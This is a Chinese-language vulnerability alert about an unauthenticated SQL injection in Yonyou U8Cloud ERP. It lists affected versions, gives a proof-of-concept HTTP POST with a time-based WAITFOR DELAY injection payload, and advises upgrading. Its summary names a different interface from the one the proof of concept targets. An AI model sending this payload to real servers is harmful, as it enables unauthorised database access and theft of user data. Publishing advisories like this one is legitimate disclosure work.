#  漏洞预警 | 用友U8Cloud SQL注入漏洞   
浅安  浅安安全   2024-03-02 08:01  
  
**0x00 漏洞编号**  
- # 暂无  
  
**0x01 危险等级**  
- 高危  
  
**0x02 漏洞概述**  
  
用友U8 cloud是一款集成的企业资源计划解决方案，旨在帮助不断发展的企业同步前后端业务功能。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/7stTqD182SXoaRemR3mxsuiciaUbPcWn9jsiaZ70u94EB6R9eOgsPln1PWpP3MSljJmZEwZYep2iakwjxN7DsbXlfg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**0x03 漏洞详情**  
###   
###   
  
**漏洞类型：**  
SQL漏洞  
  
**影响：**  
获取敏感信息  
  
**简述：**  
用友U8Cloud AppPhoneServletService接口处存在SQL注入漏洞，未授权的攻击者可通过此漏洞获取数据库权限，从而盗取用户数据，造成用户信息泄露。  
###   
  
**0x04 影响版本**  
- 用友-U8-Cloud 2.0  
  
- 用友-U8-Cloud 2.1  
  
- 用友-U8-Cloud 2.3  
  
- 用友-U8-Cloud 2.5  
  
- 用友-U8-Cloud 2.6  
  
- 用友-U8-Cloud 2.65  
  
- 用友-U8-Cloud 2.7  
  
- 用友-U8-Cloud 3.0  
  
- 用友-U8-Cloud 3.1  
  
- 用友-U8-Cloud 3.2  
  
- 用友-U8-Cloud 3.5  
  
- 用友-U8-Cloud 3.6  
  
- 用友-U8-Cloud 5.0  
  
**0x05****POC**  
```
POST /u8cuapws/rest/archive/verify HTTP/1.1
Host: {host}
User-Agent:Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
Content-Type: application/x-www-form-urlencoded
 
{"orgInfo":{"code":"1';WAITFOR DELAY '0:0:5'--"}}
```  
  
**仅供安全研究与学习之用，若将工具做其他用途，由使用者承担全部法律及连带责任，作者及发布****者**  
**不承担任何法律及连带责任。**  
  
**0x06****修复建议**  
  
**目前官方已发布漏洞修复版本，建议用户升级到安全版本****：**  
  
https://www.yonyou.com/  
  
  
  
